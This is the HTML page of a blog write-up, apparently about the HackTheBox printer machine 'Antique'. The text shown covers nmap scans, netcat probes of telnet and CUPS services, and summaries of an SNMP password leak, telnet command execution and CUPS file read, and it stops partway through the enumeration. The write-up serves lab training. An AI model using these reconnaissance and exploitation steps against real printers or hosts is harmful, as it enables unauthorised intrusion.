<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>HackTheBox - Antique | Ef's log</title><meta name=keywords content="HackTheBox,CTF,Computer Security,Cyber Security,Pentesting"><meta name=description content="Antique is one of the machines listed in the HTB printer exploitation track. It features a network printer that stores its password in plain text and is readable via SNMP. The password can be used to login into the telnet service, where it allows OS command execution, which can then be abused to gain initial access to the system. There is a CUPS service on this machine that can be exploited to read arbitrary files in the system."><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.github.io/hackthebox/antique/><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.bd459bfe4940cb0279a97213c67be3816bd3751510c3b6af22df24e8740767ba.css integrity="sha256-vUWb/klAywJ5qXITxnvjgWvTdRUQw7avIt8k6HQHZ7o=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.dbf3c8b1e1d3feb24da21a556bdfb2f51a0273aa11efcd4640113536ee29d424.js integrity="sha256-2/PIseHT/rJNohpVa9+y9RoCc6oR781GQBE1Nu4p1CQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.102.1"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - Antique"><meta property="og:description" content="Antique is one of the machines listed in the HTB printer exploitation track. It features a network printer that stores its password in plain text and is readable via SNMP. The password can be used to login into the telnet service, where it allows OS command execution, which can then be abused to gain initial access to the system. There is a CUPS service on this machine that can be exploited to read arbitrary files in the system."><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/hackthebox/antique/"><meta property="og:image" content="https://fahmifj.github.io/hackthebox/antique/imgs/image-20211016055221838.png"><meta property="article:section" content="hackthebox"><meta property="article:published_time" content="2021-10-20T06:05:34+07:00"><meta property="article:modified_time" content="2021-10-20T06:05:34+07:00"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/return/"><meta property="og:see_also" content="https://fahmifj.github.io/blog/play-with-printnightmare/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/hackthebox/antique/imgs/image-20211016055221838.png"><meta name=twitter:title content="HackTheBox - Antique"><meta name=twitter:description content="Antique is one of the machines listed in the HTB printer exploitation track. It features a network printer that stores its password in plain text and is readable via SNMP. The password can be used to login into the telnet service, where it allows OS command execution, which can then be abused to gain initial access to the system. There is a CUPS service on this machine that can be exploited to read arbitrary files in the system."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HackTheBox","item":"https://fahmifj.github.io/hackthebox/"},{"@type":"ListItem","position":2,"name":"HackTheBox - Antique","item":"https://fahmifj.github.io/hackthebox/antique/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Antique","name":"HackTheBox - Antique","description":"Antique is one of the machines listed in the HTB printer exploitation track. It features a network printer that stores its password in plain text and is readable via SNMP. The password can be used to login into the telnet service, where it allows OS command execution, which can then be abused to gain initial access to the system. There is a CUPS service on this machine that can be exploited to read arbitrary files in the system.","keywords":["HackTheBox","CTF","Computer Security","Cyber Security","Pentesting"],"articleBody":"Antique is one of the machines listed in the HTB printer exploitation track. It features a network printer that stores its password in plain text and is readable via SNMP. The password can be used to login into the telnet service, where it allows OS command execution, which can then be abused to gain initial access to the system. There is a CUPS service on this machine that can be exploited to read arbitrary files in the system.\nSkills Learned SNMP enumeration Printer Exploitation Tools Nmap Snmpwalk Reconnaissance Nmap TCP For TCP, nmap discovers 3 open ports: FTP on 22, two CUPS http servers (?) on port 9090 and 9797\n→ kali@kali «antique» «10.10.14.13» $ nmap -p- -oA nmap/all-tcp-antique 10.10.11.107 Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-15 16:13 EDT Nmap scan report for 10.10.11.107 Host is up (0.076s latency). Not shown: 65532 closed ports PORT STATE SERVICE 23/tcp open telnet 9090/tcp open zeus-admin 9797/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 121.42 seconds → kali@kali «antique» «10.10.14.13» $ nmap -sC -sV -p 23,9090,9797 -oA nmap/default-script-antique 10.10.11.107 Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-15 16:29 EDT Nmap scan report for 10.10.11.107 Host is up (0.052s latency). PORT STATE SERVICE VERSION 23/tcp open telnet? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: | JetDirect | Password: | NULL: |_ JetDirect 9090/tcp open ipp CUPS 1.6 |_http-server-header: CUPS/1.6 |_http-title: Bad Request - CUPS v1.6.1 9797/tcp open ipp CUPS 1.6 |_http-server-header: CUPS/1.6 |_http-title: Bad Request - CUPS v1.6.1 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port23-TCP:V=7.91%I=7%D=10/15%Time=6169E4A5%P=x86_64-pc-linux-gnu%r(NUL SF:L,F,\"\\nHP\\x20JetDirect\\n\\n\")%r(GenericLines,19,\"\\nHP\\x20JetDirect\\n\\nPa ...[SNIP]... Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 176.73 seconds UDP For UDP, nmap discovers SNMP on 161.\n→ kali@kali «antique» «10.10.14.13» $ sudo nmap -sU --top-ports 20 -sV -oA nmap/20-udp-antique 10.10.11.107 Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-15 17:48 EDT Nmap scan report for 10.10.11.107 Host is up (0.17s latency). PORT STATE SERVICE VERSION 53/udp open|filtered domain 67/udp open|filtered dhcps 68/udp open|filtered dhcpc 69/udp open|filtered tftp 123/udp closed ntp 135/udp closed msrpc 137/udp closed netbios-ns 138/udp open|filtered netbios-dgm 139/udp open|filtered netbios-ssn 161/udp open snmp SNMPv1 server (public) 162/udp closed snmptrap 445/udp open|filtered microsoft-ds 500/udp closed isakmp 514/udp open|filtered syslog 520/udp closed route 631/udp open|filtered ipp 1434/udp open|filtered ms-sql-m 1900/udp closed upnp 4500/udp open|filtered nat-t-ike 49152/udp open|filtered unknown Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 86.95 seconds Enumeration TCP 23 - FTP On google JetDirect has blank as default password, but it doesn’t work here.\n→ kali@kali «antique» «10.10.14.13» $ nc -vn 10.10.11.107 23 (UNKNOWN) [10.10.11.107] 23 (telnet) open HP JetDirect Password: Invalid password TCP 9090 - CUPS Visiting port 9090 on browser displays a bad request message.\nBut with nc:\n→ kali@kali «antique» «10.10.14.13» $ nc -vn 10.10.11.107 9090 (UNKNOWN) [10.10.11.107] 9090 (?) open GET / HTTP/0.9 200 OK Date: Fri, 15 Oct 2021 21:00:42 GMT Server: CUPS/1.6 Content-Language: en_US Content-Type: text/html; charset=utf-8 Last-Modified: Thu, 13 May 2021 05:36:41 GMT Content-Length: 3792 \u003c!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"\u003e ","wordCount":"1965","inLanguage":"en","image":"https://fahmifj.github.io/hackthebox/antique/imgs/image-20211016055221838.png","datePublished":"2021-10-20T06:05:34+07:00","dateModified":"2021-10-20T06:05:34+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/hackthebox/antique/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/blog/ title=blog>blog</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/hackthebox/>HackTheBox</a></div><h1 class=post-title>HackTheBox - Antique</h1><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>October 20, 2021
</span>&nbsp;&#183;&nbsp;<span class=meta-read>10 min read</span></div><hr><div class=series-info>Series:&nbsp;<a href=https://fahmifj.github.io/series/hacking-printers/>Hacking Printers</a></div></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-23---ftp aria-label="TCP 23 - FTP">TCP 23 - FTP</a></li><li><a href=#tcp-9090----cups aria-label="TCP 9090 -  CUPS">TCP 9090 - CUPS</a></li><li><a href=#tcp-9797---cups aria-label="TCP 9797 - CUPS">TCP 9797 - CUPS</a></li><li><a href=#udp-161---snmp aria-label="UDP 161 - SNMP">UDP 161 - SNMP</a></li><li><a href=#finding-vulnerabilities aria-label="Finding Vulnerabilities">Finding Vulnerabilities</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#shell-as-lp aria-label="Shell as lp">Shell as lp</a></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#file-read aria-label="File read">File read</a></li></ul></li></ul></div></aside><div class=post-content><figure class=entry-cover><img srcset="https://fahmifj.github.io/hackthebox/antique/imgs/image-20211016055221838_huf1faa8bb89124216cf74c2a471283ee4_91289_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/hackthebox/antique/imgs/image-20211016055221838_huf1faa8bb89124216cf74c2a471283ee4_91289_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/hackthebox/antique/imgs/image-20211016055221838_huf1faa8bb89124216cf74c2a471283ee4_91289_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/hackthebox/antique/imgs/image-20211016055221838.png 875w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/hackthebox/antique/imgs/image-20211016055221838.png alt width=875 height=645></figure><p>Antique is one of the machines listed in the HTB printer exploitation track. It features a network printer that stores its password in plain text and is readable via SNMP. The password can be used to login into the telnet service, where it allows OS command execution, which can then be abused to gain initial access to the system. There is a <a href=https://www.cups.org/>CUPS</a> service on this machine that can be exploited to read arbitrary files in the system.</p><h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4><ul><li>SNMP enumeration</li><li>Printer Exploitation</li></ul><h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4><ul><li>Nmap</li><li>Snmpwalk</li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3><h4 id=tcp>TCP<a class=anchor aria-hidden=true href=#tcp>#</a></h4><p>For TCP, <code>nmap</code> discovers 3 open ports: FTP on 22, two CUPS http servers (?) on port 9090 and 9797</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «antique» «10.10.14.13» 
</span></span><span class=line><span class=cl>$ nmap  -p- -oA nmap/all-tcp-antique 10.10.11.107   
</span></span><span class=line><span class=cl>Starting Nmap 7.91 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-10-15 16:13 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.107
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.076s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>65532</span> closed ports
</span></span><span class=line><span class=cl>PORT     STATE SERVICE
</span></span><span class=line><span class=cl>23/tcp   open  telnet
</span></span><span class=line><span class=cl>9090/tcp open  zeus-admin
</span></span><span class=line><span class=cl>9797/tcp open  unknown
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 121.42 seconds
</span></span><span class=line><span class=cl>→ kali@kali «antique» «10.10.14.13» 
</span></span><span class=line><span class=cl>$ nmap -sC -sV -p 23,9090,9797 -oA nmap/default-script-antique 10.10.11.107 
</span></span><span class=line><span class=cl>Starting Nmap 7.91 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-10-15 16:29 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.107
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.052s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE VERSION
</span></span><span class=line><span class=cl>23/tcp   open  telnet?
</span></span><span class=line><span class=cl><span class=p>|</span> fingerprint-strings: 
</span></span><span class=line><span class=cl><span class=p>|</span>   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
</span></span><span class=line><span class=cl><span class=p>|</span>     JetDirect
</span></span><span class=line><span class=cl><span class=p>|</span>     Password:
</span></span><span class=line><span class=cl><span class=p>|</span>   NULL: 
</span></span><span class=line><span class=cl><span class=p>|</span>_    JetDirect
</span></span><span class=line><span class=cl>9090/tcp open  ipp     CUPS 1.6
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: CUPS/1.6
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Bad Request - CUPS v1.6.1
</span></span><span class=line><span class=cl>9797/tcp open  ipp     CUPS 1.6
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: CUPS/1.6
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Bad Request - CUPS v1.6.1
</span></span><span class=line><span class=cl><span class=m>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class=line><span class=cl>SF-Port23-TCP:V<span class=o>=</span>7.91%I<span class=o>=</span>7%D<span class=o>=</span>10/15%Time<span class=o>=</span>6169E4A5%P<span class=o>=</span>x86_64-pc-linux-gnu%r<span class=o>(</span>NUL
</span></span><span class=line><span class=cl>SF:L,F,<span class=s2>&#34;\nHP\x20JetDirect\n\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>GenericLines,19,<span class=s2>&#34;\nHP\x20JetDirect\n\nPa
</span></span></span><span class=line><span class=cl><span class=s2>...[SNIP]...
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=s2>Nmap done: 1 IP address (1 host up) scanned in 176.73 seconds
</span></span></span></code></pre></div><h4 id=udp>UDP<a class=anchor aria-hidden=true href=#udp>#</a></h4><p>For UDP, <code>nmap</code> discovers SNMP on 161.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «antique» «10.10.14.13» 
</span></span><span class=line><span class=cl>$ sudo nmap -sU --top-ports <span class=m>20</span> -sV -oA nmap/20-udp-antique 10.10.11.107
</span></span><span class=line><span class=cl>Starting Nmap 7.91 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-10-15 17:48 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.107
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.17s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT      STATE         SERVICE      VERSION
</span></span><span class=line><span class=cl>53/udp    open<span class=p>|</span>filtered domain
</span></span><span class=line><span class=cl>67/udp    open<span class=p>|</span>filtered dhcps
</span></span><span class=line><span class=cl>68/udp    open<span class=p>|</span>filtered dhcpc
</span></span><span class=line><span class=cl>69/udp    open<span class=p>|</span>filtered tftp
</span></span><span class=line><span class=cl>123/udp   closed        ntp
</span></span><span class=line><span class=cl>135/udp   closed        msrpc
</span></span><span class=line><span class=cl>137/udp   closed        netbios-ns
</span></span><span class=line><span class=cl>138/udp   open<span class=p>|</span>filtered netbios-dgm
</span></span><span class=line><span class=cl>139/udp   open<span class=p>|</span>filtered netbios-ssn
</span></span><span class=line><span class=cl>161/udp   open          snmp         SNMPv1 server <span class=o>(</span>public<span class=o>)</span>
</span></span><span class=line><span class=cl>162/udp   closed        snmptrap
</span></span><span class=line><span class=cl>445/udp   open<span class=p>|</span>filtered microsoft-ds
</span></span><span class=line><span class=cl>500/udp   closed        isakmp
</span></span><span class=line><span class=cl>514/udp   open<span class=p>|</span>filtered syslog
</span></span><span class=line><span class=cl>520/udp   closed        route
</span></span><span class=line><span class=cl>631/udp   open<span class=p>|</span>filtered ipp
</span></span><span class=line><span class=cl>1434/udp  open<span class=p>|</span>filtered ms-sql-m
</span></span><span class=line><span class=cl>1900/udp  closed        upnp
</span></span><span class=line><span class=cl>4500/udp  open<span class=p>|</span>filtered nat-t-ike
</span></span><span class=line><span class=cl>49152/udp open<span class=p>|</span>filtered unknown
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 86.95 seconds
</span></span></code></pre></div><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-23---ftp>TCP 23 - FTP<a class=anchor aria-hidden=true href=#tcp-23---ftp>#</a></h3><p>On google JetDirect has blank as default password, but it doesn&rsquo;t work here.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «antique» «10.10.14.13» 
</span></span><span class=line><span class=cl>$ nc -vn 10.10.11.107 <span class=m>23</span>
</span></span><span class=line><span class=cl><span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.11.107<span class=o>]</span> <span class=m>23</span> <span class=o>(</span>telnet<span class=o>)</span> open
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>HP JetDirect
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>Password:  
</span></span><span class=line><span class=cl>Invalid password
</span></span></code></pre></div><h3 id=tcp-9090----cups>TCP 9090 - CUPS<a class=anchor aria-hidden=true href=#tcp-9090----cups>#</a></h3><p>Visiting port 9090 on browser displays a bad request message.</p><p><div class=img-container><img src=imgs/image-20211016040206248.png alt=image-20211016040206248></div></p><p>But with <code>nc</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «antique» «10.10.14.13» 
</span></span><span class=line><span class=cl>$ nc -vn 10.10.11.107 <span class=m>9090</span>
</span></span><span class=line><span class=cl><span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.11.107<span class=o>]</span> <span class=m>9090</span> <span class=o>(</span>?<span class=o>)</span> open
</span></span><span class=line><span class=cl>GET /
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>HTTP/0.9 <span class=m>200</span> OK
</span></span><span class=line><span class=cl>Date: Fri, <span class=m>15</span> Oct <span class=m>2021</span> 21:00:42 GMT
</span></span><span class=line><span class=cl>Server: CUPS/1.6
</span></span><span class=line><span class=cl>Content-Language: en_US
</span></span><span class=line><span class=cl>Content-Type: text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>utf-8
</span></span><span class=line><span class=cl>Last-Modified: Thu, <span class=m>13</span> May <span class=m>2021</span> 05:36:41 GMT
</span></span><span class=line><span class=cl>Content-Length: <span class=m>3792</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;!DOCTYPE HTML PUBLIC <span class=s2>&#34;-//W3C//DTD HTML 4.0 Transitional//EN&#34;</span> <span class=s2>&#34;http://www.w3.org/TR/html4/loose.dtd&#34;</span>&gt;
</span></span><span class=line><span class=cl>&lt;HTML&gt;
</span></span><span class=line><span class=cl>&lt;HEAD&gt;
</span></span><span class=line><span class=cl>        &lt;META HTTP-EQUIV<span class=o>=</span><span class=s2>&#34;Content-Type&#34;</span> <span class=nv>CONTENT</span><span class=o>=</span><span class=s2>&#34;text/html; charset=utf-8&#34;</span>&gt;
</span></span><span class=line><span class=cl>        &lt;TITLE&gt;Home - CUPS 1.6.1&lt;/TITLE&gt;
</span></span><span class=line><span class=cl>        &lt;LINK <span class=nv>REL</span><span class=o>=</span><span class=s2>&#34;STYLESHEET&#34;</span> <span class=nv>TYPE</span><span class=o>=</span><span class=s2>&#34;text/css&#34;</span> <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;/cups.css&#34;</span>&gt;
</span></span><span class=line><span class=cl>        &lt;LINK <span class=nv>REL</span><span class=o>=</span><span class=s2>&#34;SHORTCUT ICON&#34;</span> <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;/images/cups-icon.png&#34;</span> <span class=nv>TYPE</span><span class=o>=</span><span class=s2>&#34;image/png&#34;</span>&gt;
</span></span><span class=line><span class=cl>&lt;/HEAD&gt;
</span></span><span class=line><span class=cl>&lt;BODY&gt;
</span></span><span class=line><span class=cl>&lt;TABLE <span class=nv>CLASS</span><span class=o>=</span><span class=s2>&#34;page&#34;</span> <span class=nv>SUMMARY</span><span class=o>=</span><span class=s2>&#34;{title}&#34;</span>&gt;
</span></span><span class=line><span class=cl>&lt;TR&gt;&lt;TD <span class=nv>CLASS</span><span class=o>=</span><span class=s2>&#34;body&#34;</span>&gt;
</span></span><span class=line><span class=cl>&lt;TABLE <span class=nv>BORDER</span><span class=o>=</span><span class=s2>&#34;0&#34;</span> <span class=nv>CELLPADDING</span><span class=o>=</span><span class=s2>&#34;0&#34;</span> <span class=nv>CELLSPACING</span><span class=o>=</span><span class=s2>&#34;0&#34;</span> <span class=nv>SUMMARY</span><span class=o>=</span><span class=s2>&#34;&#34;</span>&gt;
</span></span><span class=line><span class=cl>&lt;TR <span class=nv>HEIGHT</span><span class=o>=</span><span class=s2>&#34;36&#34;</span>&gt;
</span></span><span class=line><span class=cl>&lt;TD&gt;&lt;A <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;http://www.cups.org/&#34;</span> <span class=nv>TARGET</span><span class=o>=</span><span class=s2>&#34;_blank&#34;</span>&gt;&lt;IMG
</span></span><span class=line><span class=cl><span class=nv>SRC</span><span class=o>=</span><span class=s2>&#34;/images/left.gif&#34;</span> <span class=nv>WIDTH</span><span class=o>=</span><span class=s2>&#34;64&#34;</span> <span class=nv>HEIGHT</span><span class=o>=</span><span class=s2>&#34;36&#34;</span> <span class=nv>BORDER</span><span class=o>=</span><span class=s2>&#34;0&#34;</span> <span class=nv>ALT</span><span class=o>=</span><span class=s2>&#34;&#34;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
</span></span><span class=line><span class=cl>&lt;TD <span class=nv>CLASS</span><span class=o>=</span><span class=s2>&#34;sel&#34;</span>&gt;&lt;A <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;/&#34;</span>&gt;<span class=p>&amp;</span>nbsp<span class=p>;&amp;</span>nbsp<span class=p>;</span>Home<span class=p>&amp;</span>nbsp<span class=p>;&amp;</span>nbsp<span class=p>;</span>&lt;/A&gt;&lt;/TD&gt;
</span></span><span class=line><span class=cl>&lt;TD <span class=nv>CLASS</span><span class=o>=</span><span class=s2>&#34;unsel&#34;</span>&gt;&lt;A <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;/admin&#34;</span>&gt;<span class=p>&amp;</span>nbsp<span class=p>;&amp;</span>nbsp<span class=p>;</span>Administration<span class=p>&amp;</span>nbsp<span class=p>;&amp;</span>nbsp<span class=p>;</span>&lt;/A&gt;&lt;/TD&gt;
</span></span><span class=line><span class=cl>&lt;TD <span class=nv>CLASS</span><span class=o>=</span><span class=s2>&#34;unsel&#34;</span>&gt;&lt;A <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;/classes/&#34;</span>&gt;<span class=p>&amp;</span>nbsp<span class=p>;&amp;</span>nbsp<span class=p>;</span>Classes<span class=p>&amp;</span>nbsp<span class=p>;&amp;</span>nbsp<span class=p>;</span>&lt;/A&gt;&lt;/TD&gt;
</span></span><span class=line><span class=cl>&lt;TD <span class=nv>CLASS</span><span class=o>=</span><span class=s2>&#34;unsel&#34;</span>&gt;&lt;A <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;/help/&#34;</span>&gt;<span class=p>&amp;</span>nbsp<span class=p>;&amp;</span>nbsp<span class=p>;</span>Online<span class=p>&amp;</span>nbsp<span class=p>;</span>Help<span class=p>&amp;</span>nbsp<span class=p>;&amp;</span>nbsp<span class=p>;</span>&lt;/A&gt;&lt;/TD&gt;
</span></span><span class=line><span class=cl>&lt;TD <span class=nv>CLASS</span><span class=o>=</span><span class=s2>&#34;unsel&#34;</span>&gt;&lt;A <span class=nv>HREF</span><span class=o>=</span><span class=s2>&#34;/jobs/&#34;</span>&gt;<span class=p>&amp;</span>nbsp<span class=p>;&amp;</span>nbsp<span class=p>;</span>Jobs<span class=p>&amp;</span>nbsp<span class=p>;&amp;</span>nbsp<span class=p>;</span>&lt;/A&gt;&lt;/TD&gt;
